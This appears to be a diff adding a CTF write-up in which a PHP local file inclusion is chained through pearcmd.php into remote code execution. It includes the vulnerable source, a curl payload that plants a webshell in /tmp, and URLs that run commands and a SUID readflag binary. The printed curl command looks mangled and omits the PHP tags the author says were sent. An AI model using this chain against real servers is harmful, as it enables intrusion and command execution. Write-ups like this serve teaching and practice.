@@ -379,3 +379,102 @@ The exploit worked flawlessly. The authentication was bypassed, and I was grante
 ![flag](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/easyinjection/flag.png)    
 
 **Final Flag:** `CATF{E4SY_e4sy_Easy_1nj3c410n}`
+
+* * *
+
+# 🕸️ Web Series: I love PHP
+
+Welcome back! This challenge was a real treat for PHP lovers (and haters). The title says it all, and the description gave a huge hint: "PHP is a weird way to spell RCE." It started as a simple file inclusion and turned into a full Remote Code Execution (RCE) using a clever trick with the PHP PEAR management tool.
+
+**Author:** 0xdblm  
+**Points:** 464 
+
+![challenge](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/lovephp/challenge.png)
+
+---
+
+## 📝 The Challenge Description
+> "PHP is a weird way to spell RCE"
+
+> **URL:** `http://167.99.34.2:8888/`
+
+Upon visiting the homepage, the source code was displayed directly:
+
+`<?php 
+$file = $_GET['file'] ?? null; 
+if ($file) { 
+    if (strpos($file, 'file://') === 0) { 
+        include($file); 
+    } 
+} else { 
+    highlight_file(__FILE__); 
+}`
+
+🔍 Phase 1: Initial Discovery & Failed Attempts
+-----------------------------------------------
+
+The code has a clear **Local File Inclusion (LFI)** vulnerability via the `include($file)` function. However, the path **must** start with `file://`.
+
+### My Failed Attempts:
+
+1.  **PHP Filters:** I tried `file://php://filter/...` to read files, but it failed because PHP interpreted it as a literal local path rather than a wrapper.
+    
+2.  **Log Poisoning:** I attempted to reach standard log paths (Nginx/Apache), but they were inaccessible or didn't exist.
+    
+* * *
+
+💡 Phase 2: The Exploit (Pearcmd.php RCE)
+-----------------------------------------
+
+Remembering the "RCE" hint, I focused on a powerful technique: exploiting **`pearcmd.php`**.
+
+In many PHP Docker environments, PEAR is installed at `/usr/local/lib/php/pearcmd.php`. If `register_argc_argv` is enabled, we can pass command-line arguments via the URL.
+
+### The Attack Plan:
+
+Use the `config-create` command in PEAR to write a custom PHP WebShell into the `/tmp/` directory.
+
+### The "Golden" Payload:
+
+I used **`curl`** with the `-g` (globoff) flag to ensure the brackets and PHP tags were sent exactly as written.
+
+**Command:**
+
+    curl -g -v "[http://167.99.34.2:8888/?+config-create+/&file=file:///usr/local/lib/php/pearcmd.php&/](http://167.99.34.2:8888/?+config-create+/&file=file:///usr/local/lib/php/pearcmd.php&/)+/tmp/0xaskar.php" 
+
+![curl](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/lovephp/curl.png)
+
+The server responded with: `Successfully created default configuration file "/tmp/0xaskar.php"`
+
+* * *
+
+🏁 Phase 3: Command Execution & Flag
+------------------------------------
+
+Now that my shell `/tmp/0xaskar.php` was created, I used the original LFI vulnerability to execute it.
+
+### 1\. Listing Directory Contents
+
+By navigating to: `http://167.99.34.2:8888/?file=file:///tmp/0xaskar.php&1=ls -la /`
+
+![php](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/lovephp/php.png)
+
+The output showed the raw PEAR configuration file, but hidden inside the strings was the output of my `ls` command! I found an interesting SUID binary:
+
+    -rwsr-xr-x 1 root root 14336 Mar 21 22:50 readflag 
+
+![readflag](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/lovephp/readflag.png)
+
+### 2\. The Final Blow
+
+I executed the binary to read the flag: `http://167.99.34.2:8888/?file=file:///tmp/0xaskar.php&1=/readflag`
+
+The flag appeared multiple times within the PEAR configuration output:
+
+![flag](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Entry%20Cat%20CTF/lovephp/flag.png)
+
+**Response Snippet:**
+
+> `.../&file=file:/usr/local/lib/php/pearcmd.php&/CATF{TH3_M05T_TH1NG_1_L0V3_AB0UT_PHP_15_TH4T_H0W3V3R_SM4LL_TH3_C0D3_15_Y0U_C4N_ALW4Y5_G3T_4N_RCE}...`
+
+**Final Flag:** `CATF{TH3_M05T_TH1NG_1_L0V3_AB0UT_PHP_15_TH4T_H0W3V3R_SM4LL_TH3_C0D3_15_Y0U_C4N_ALW4Y5_G3T_4N_RCE}`
